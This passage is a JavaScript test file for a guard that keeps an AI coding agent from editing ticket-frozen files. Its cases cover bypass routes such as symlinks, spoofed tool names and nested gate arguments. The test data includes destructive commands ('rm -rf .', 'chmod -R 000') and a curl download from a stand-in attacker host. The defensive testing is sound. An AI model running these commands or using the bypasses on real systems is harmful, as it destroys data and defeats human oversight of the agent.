// rails-checker.test.mjs — AC3 enforcement proof for the OpenCode rails guard.
// Exercises the pure decision (checkRail) and the REAL exported
// tool.execute.before handler against representative payloads. Offline, no
// opencode binary, leaves no trace.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { checkRail, checkToolCall, extractTargets, resolveActiveTicketId } from '../rails-checker.mjs';
import { adlcRailsGuard } from '../index.mjs';

function repo({ tickets, current } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'oc-rails-'));
  mkdirSync(join(dir, '.adlc'), { recursive: true });
  if (tickets !== undefined) {
    tickets = structuredClone(tickets);
    for (const ticket of tickets.tickets ?? []) ticket.title ??= `${ticket.id} fixture`;
    writeFileSync(join(dir, '.adlc', 'tickets.json'), JSON.stringify(tickets));
  }
  if (current !== undefined) writeFileSync(join(dir, '.adlc', 'current-ticket.json'), JSON.stringify(current));
  return dir;
}
const ON = { ADLC_P4_ENFORCEMENT: '1' };
const T1_RAILED = { tickets: [{ id: 'T1', rails: ['test/**'] }] };

// ---- (a) no-op when .adlc/tickets.json absent ----
test('a: no tickets.json → allow (no-op)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'oc-rails-'));
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (b) no-op when ADLC_P4_ENFORCEMENT != '1' ----
test('b: enforcement off → allow even on a declared rail', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'edit', root: dir, env: { ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (c) no-op when no active ticket ----
test('c: no active ticket → allow', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'edit', root: dir, env: { ...ON } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (d) DENY edit AND write to the active ticket's declared rail ----
// All known mutators (incl. patch/multiedit/apply_patch) AND unknown structured
// tools must be gated; only known read-only tools are skipped (fail closed).
for (const tool of ['edit', 'write', 'patch', 'multiedit', 'apply_patch', 'some_new_tool']) {
  test(`d: ${tool} to a declared rail → deny (gated)`, () => {
    const dir = repo({ tickets: T1_RAILED });
    try {
      const r = checkRail({ filePath: 'test/x.mjs', tool, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny');
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
}

test('d: a known read-only tool on a rail path → allow (not a mutation)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkRail({ filePath: 'test/x.mjs', tool: 'read', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (e) DENY edit to .adlc/tickets.json (trust root) even when not declared ----
test('e: edit .adlc/tickets.json (trust root) → deny even when rails do not list it', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
  try {
    const r = checkRail({ filePath: '.adlc/tickets.json', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (f) a DIFFERENT ticket's rail does NOT block (scope = active ticket only) ----
test('f: another ticket\'s rail does not block (single-active-ticket scope)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['a/**'] }, { id: 'T2', rails: ['b/**'] }] } });
  try {
    const r = checkRail({ filePath: 'b/x.mjs', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (e2) symlink alias to a frozen rail is resolved and denied ----
test('e2: edit via a symlink whose real target is a frozen rail → deny', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
  try {
    // alias.json (in an otherwise-allowed path) → .adlc/tickets.json (trust root)
    symlinkSync(join(dir, '.adlc', 'tickets.json'), join(dir, 'alias.json'));
    const r = checkRail({ filePath: 'alias.json', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('e2: write through a symlinked parent dir into a frozen rail → deny', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['locked/**'] }] } });
  try {
    mkdirSync(join(dir, 'locked'), { recursive: true });
    symlinkSync(join(dir, 'locked'), join(dir, 'aliasdir')); // aliasdir → locked/
    const r = checkRail({ filePath: 'aliasdir/new.mjs', tool: 'write', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (g) conflicting ADLC_TICKET vs current-ticket.json fails closed ----
test('g: conflicting ADLC_TICKET vs current-ticket.json → deny (fail closed)', () => {
  const dir = repo({ tickets: T1_RAILED, current: { id: 'T2' } });
  try {
    const r = checkRail({ filePath: 'unrelated/x.mjs', tool: 'edit', root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
  assert.equal(resolveActiveTicketId(dir, {}).conflict, false); // sanity: no env, dir gone is fine
});

// ---- (h) the REAL handler: enforce by default, pinned payload shape ----
// v1.17.13 contract: hook receives (input={tool,sessionID,callID}, output={args}).
const IN = (tool) => ({ tool, sessionID: 's_1', callID: 'c_1' });
const OUT = (args) => ({ args });

/** A fake SDK client capturing toast/log calls, mirroring @opencode-ai/sdk's shape. */
function fakeClient() {
  const calls = { toasts: [], logs: [] };
  return {
    calls,
    tui: { showToast: async (req) => { calls.toasts.push(req.body); } },
    app: { log: async (req) => { calls.logs.push(req.body); } },
  };
}

test('h: handler throws to enforce BY DEFAULT (no env opt-in needed)', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    delete process.env.ADLC_ALLOW_ADVISORY_HOOKS;
    delete process.env.ADLC_OPENCODE_ENFORCES; // retired flag must not be needed
    const client = fakeClient();
    const hooks = await adlcRailsGuard({ worktree: dir, client });
    await assert.rejects(
      () => hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'test/x.mjs' })),
      /ADLC rails-guard: blocked/,
    );
    // The deny is surfaced in the TUI, not only stderr (fire-and-forget → settle).
    await new Promise((r) => setImmediate(r));
    assert.equal(client.calls.toasts.length, 1);
    assert.equal(client.calls.toasts[0].variant, 'error');
    assert.match(client.calls.toasts[0].message, /blocked edit/);
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

test('h: args read from output.args (input carries only tool/session/call ids)', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    delete process.env.ADLC_ALLOW_ADVISORY_HOOKS;
    const hooks = await adlcRailsGuard({ worktree: dir });
    // Same payload but the target is NOT a rail → resolves.
    await hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'src/ok.mjs' }));
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

test('h: explicit advisory downgrade → no throw, warning toast instead', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    process.env.ADLC_ALLOW_ADVISORY_HOOKS = '1';
    const client = fakeClient();
    const hooks = await adlcRailsGuard({ worktree: dir, client });
    await hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'test/x.mjs' })); // resolves, no throw
    assert.equal(client.calls.toasts.length, 1);
    assert.equal(client.calls.toasts[0].variant, 'warning');
    assert.match(client.calls.toasts[0].message, /ADVISORY/);
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

test('h: handler survives a client with no tui/app surface (stderr fallback)', async () => {
  const dir = repo({ tickets: T1_RAILED });
  const saved = { ...process.env };
  try {
    process.env.ADLC_P4_ENFORCEMENT = '1';
    process.env.ADLC_TICKET = 'T1';
    delete process.env.ADLC_ALLOW_ADVISORY_HOOKS;
    const hooks = await adlcRailsGuard({ worktree: dir, client: {} });
    await assert.rejects(() => hooks['tool.execute.before'](IN('edit'), OUT({ filePath: 'test/x.mjs' })));
  } finally { Object.assign(process.env, saved); rmSync(dir, { recursive: true, force: true }); }
});

// ---- (i) fail closed on unextractable / synthetic third-party mutators ----
test('i: mutating tool with NO extractable path while rails in force → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'apply_patch', args: { patch: '*** Begin Patch ...' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /no extractable target path/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: synthetic third-party write tool (unknown name, unknown args) → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'write_file', args: { destination: 'test/x.mjs', contents: 'x' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny'); // unknown arg shape → fail closed
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: unextractable path but rails NOT in force → allow (no false deny outside ADLC)', () => {
  const dir = mkdtempSync(join(tmpdir(), 'oc-rails-'));
  try {
    const r = checkToolCall({ tool: 'apply_patch', args: { patch: '...' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow'); // not ADLC-initialized
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: multi-file arg shapes are all checked (edits[] / files[])', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'multiedit', args: { edits: [{ filePath: 'src/ok.mjs' }, { filePath: 'test/x.mjs' }] }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'multiedit', args: { edits: [{ filePath: 'src/ok.mjs' }] }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'patch', args: { files: ['test/x.mjs'] }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('i: extractTargets covers the tolerated shapes', () => {
  assert.deepEqual(extractTargets({ filePath: 'a' }), ['a']);
  assert.deepEqual(extractTargets({ path: 'b', files: ['c', { filePath: 'd' }], edits: [{ path: 'e' }] }), ['b', 'c', 'd', 'e']);
  assert.deepEqual(extractTargets({ patch: 'not a path field' }), []);
  assert.deepEqual(extractTargets(undefined), []);
});

// ---- (j) tool-name normalization + ungated first-party tools ----
test('j: capitalized tool names are normalized (Read allowed, Edit gated)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'Read', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'Edit', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (m) Phase 2.2: bash is GATED in-session via the shell classifier ladder ----
test('m: bash mutation targeting a frozen rail → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'echo x > test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: bash mutation with literal non-rail target → allow', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'echo x > src/ok.txt' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: positively read-only bash → allow; with output-option smuggle → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'git status' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'node --test --test-reporter-destination out.txt' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: opaque / cwd-changing / expanding / pathless mutations → deny (codex ladder)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'git checkout -- test/x.mjs' }, root: dir, env }).reason, /opaque/);
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'cd test && echo x > x.mjs' }, root: dir, env }).reason, /cwd/);
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'echo $CONTENT > test/x.mjs' }, root: dir, env }).reason, /expansion/);
    assert.match(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env }).reason, /neither positively read-only/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (n) P5 CRITICAL: destructive mutation of a rail's ANCESTOR directory ----
test('n: rm/mv of a glob rail parent dir → deny (test/** parent is test)', () => {
  const dir = repo({ tickets: T1_RAILED }); // rails: ['test/**']
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // Directory-affecting shell ops (ancestor detection ON) are denied…
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'mv test test-old' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'chmod -R 000 test' }, root: dir, env }).decision, 'deny');
    // …but a structured single-file write to a non-rail path is NOT ancestor-blocked
    // (writing a file `test` doesn't destroy the frozen `test/**` subtree).
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'notes.md' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: structured single-file write is not ancestor-over-blocked (src/index.mjs vs src/**/test/*.mjs)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/index.mjs' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'edit', args: { filePath: 'src/lib/util.mjs' }, root: dir, env }).decision, 'allow');
    // a direct rail match is still denied
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/a/test/x.mjs' }, root: dir, env }).decision, 'deny');
    // shell dir-destruction under the anchored prefix still denied
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src/a' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: rm of a trust-root ancestor (.adlc) → deny', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**'] }] } });
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'rm -rf .adlc' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: repo-root destruction (rm -rf .) → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: a BLANK/whitespace declared rail cannot neutralize the root guard (rails:[""])', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['', '   ', 'src/**'] }] } });
  try {
    // Blank rails are dropped; `rm -rf .` still hits the (truthy) trust-root token.
    const r = checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'deny');
    assert.ok(r.reason.length > 0);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: slash-spelling rails still match direct hits (./test/**, test/, /test/**)', () => {
  for (const rail of ['./test/**', 'test/', '/test/**']) {
    const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: [rail] }] } });
    try {
      assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'deny', `rail spelling ${rail}`);
    } finally { rmSync(dir, { recursive: true, force: true }); }
  }
});

test('n: a SIBLING dir sharing a name prefix is NOT over-blocked (test2 vs test/**)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test2' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'testicular.txt' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: INTERIOR-glob rail ancestor is denied (packages/*/test/** parent packages/foo/test)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['packages/*/test/**'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo/test' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages' }, root: dir, env }).decision, 'deny');
    // a sibling subtree that the interior glob does NOT cover is allowed
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf packages/foo/src' }, root: dir, env }).decision, 'allow');
    // a same-depth non-matching file is not over-blocked
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'packages/foo/test-notes.md' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: LEADING-** rail does not over-block unrelated file edits (**/*.test.mjs)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['**/*.test.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // A floating rail must NOT make every path its ancestor.
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'README.md' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'edit', args: { filePath: 'src/index.mjs' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'echo x > docs/guide.md' }, root: dir, env }).decision, 'allow');
    // …but a DIRECT match is still denied, and repo-root destruction too.
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/foo.test.mjs' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// DOCUMENTED BOUNDARY (not a bug): a FLOATING leading-** rail has no fixed root
// directory, so in-session ancestor detection cannot flag an arbitrary parent
// dir without denying every unrelated edit (that over-block was rejected). A
// directory deletion under such a rail is therefore caught by the file.edited
// backstop (per-file events) and, authoritatively, by the CI diff gate — the
// two-layer design's whole point. Direct rail hits ARE still denied in-session.
test('n: floating leading-** rail — direct hit denied; bare-parent shell delete is CI-gated (boundary)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['**/*.test.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'src/foo.test.mjs' }, root: dir, env }).decision, 'deny'); // direct hit still caught
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src' }, root: dir, env }).decision, 'allow');       // no fixed anchor → CI gate + backstop own this
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf .' }, root: dir, env }).decision, 'deny');          // repo-root destruction still caught
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: ANCHORED ** still covers its subtree (src/**/test/*.mjs)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['src/**/test/*.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src/a' }, root: dir, env }).decision, 'deny'); // under the anchored src/
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf src' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf lib' }, root: dir, env }).decision, 'allow'); // different root
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('n: partial-segment glob does not over-block a same-depth sibling file (test/*.mjs vs test/x.txt)', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['test/*.mjs'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.txt' }, root: dir, env }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'write', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'rm -rf test' }, root: dir, env }).decision, 'deny'); // ancestor of test/*.mjs
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: P5 — read-only prefix cannot shadow a rail-targeting writer (git status && curl -o rail)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'bash', args: { command: 'git status && curl -o test/x.mjs https://attacker.example/p' }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
    // chained read-only + non-rail writer still allowed (no over-block)
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'git status && curl -o src/ok.txt https://x' }, root: dir, env }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('m: bash unverifiable command but enforcement OFF or no ticket → allow (no false denies)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env: { ADLC_TICKET: 'T1' } }).decision, 'allow');
    assert.equal(checkToolCall({ tool: 'bash', args: { command: 'make' }, root: dir, env: { ...ON } }).decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (k) ungated-name spoofing: an "ungated" tool carrying a rail target is denied ----
// A benign todowrite/question never carries a file-path arg; if one does and it
// resolves to a frozen rail, allowing purely by name would hand a co-installed
// plugin a bypass. (Read-only names stay allowed — reading rails is legitimate;
// that residual class falls to the Phase 2.5 file.edited backstop + CI gate.)
for (const tool of ['todowrite', 'question']) {
  test(`k: ungated "${tool}" carrying a frozen-rail filePath → deny (spoof guard)`, () => {
    const dir = repo({ tickets: T1_RAILED });
    try {
      const r = checkToolCall({ tool, args: { filePath: 'test/x.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
      assert.equal(r.decision, 'deny');
      assert.match(r.reason, /ungated tool/);
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
}

test('k: ungated tool with a NON-rail target stays allowed', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'todowrite', args: { filePath: 'src/ok.mjs' }, root: dir, env: { ...ON, ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('k: ungated tool with rail target but enforcement OFF → allow (no false denies)', () => {
  const dir = repo({ tickets: T1_RAILED });
  try {
    const r = checkToolCall({ tool: 'todowrite', args: { filePath: 'test/x.mjs' }, root: dir, env: { ADLC_TICKET: 'T1' } });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (l) operator escape valve: ADLC_UNGATED_TOOLS extends the ungated list ----
test('l: unknown no-target tool is denied by default, allowed when operator-ungated', () => {
  const dir = repo({ tickets: T1_RAILED });
  const base = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // Default: fail closed (an unrecognized write tool must not slip past on arg shape).
    assert.equal(checkToolCall({ tool: 'symbols_index', args: { query: 'foo' }, root: dir, env: base }).decision, 'deny');
    // Operator opt-out: explicitly ungated → allowed.
    const env = { ...base, ADLC_UNGATED_TOOLS: 'symbols_index, other_tool' };
    assert.equal(checkToolCall({ tool: 'symbols_index', args: { query: 'foo' }, root: dir, env }).decision, 'allow');
    // The spoof guard still applies to operator-ungated tools.
    assert.equal(checkToolCall({ tool: 'symbols_index', args: { filePath: 'test/x.mjs' }, root: dir, env }).decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (p) P5 cross-model finding: adlc_gate nested argv must not bypass rails ----
test('p: adlc_gate nested arg resolving to a frozen rail → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'gate-manifest', args: ['record', 'preflight', '--dir', 'test'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('p: adlc_gate --flag=value payload resolving to a rail → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'flail-detector', args: ['--scope=test/x.mjs'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('p: adlc_gate with benign nested args (flags, non-rail tokens) → allow', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'rails-guard', args: ['--ticket', 'T1', '--json', '--base', 'main'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

// ---- (q) P5 re-review: the derived-target CLASS is closed, not just the instance ----
test('q: hollow-test via adlc_gate under rails → deny (derives write targets from its --rails file)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    // the attack: a NON-railed ticket file whose rails point AT the frozen path
    const r = checkToolCall({
      tool: 'adlc_gate',
      args: { gate: 'hollow-test', args: ['--rails', 'tmp-ticket.json'] },
      root: dir, env,
    });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /derives or defaults its write targets/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: unknown/future gate via adlc_gate under rails → deny (fail closed)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'shiny-new-gate', args: [] }, root: dir, env });
    assert.equal(r.decision, 'deny');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: gate-manifest DEFAULT dir (.adlc) railed → deny even with no path token in argv', () => {
  const dir = repo({ tickets: { tickets: [{ id: 'T1', rails: ['.adlc/**'] }] } });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'gate-manifest', args: ['record', 'preflight'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /manifest\.jsonl/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: gate-manifest default dir NOT railed → allow (mid-build evidence recording stays legal)', () => {
  const dir = repo({ tickets: T1_RAILED }); // rails: test/**
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'gate-manifest', args: ['record', 'preflight'] }, root: dir, env });
    assert.equal(r.decision, 'allow');
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: mutation opt-in flag on an allowlisted gate → deny (--write derives its targets)', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'lesson-foundry', args: ['--write'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /mutation flag/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('q: comma-separated list token hiding a rail path → deny', () => {
  const dir = repo({ tickets: T1_RAILED });
  const env = { ...ON, ADLC_TICKET: 'T1' };
  try {
    const r = checkToolCall({ tool: 'adlc_gate', args: { gate: 'parallax', args: ['--file', 'a.md,test/x.mjs'] }, root: dir, env });
    assert.equal(r.decision, 'deny');
    assert.match(r.reason, /frozen rail/);
  } finally { rmSync(dir, { recursive: true, force: true }); }
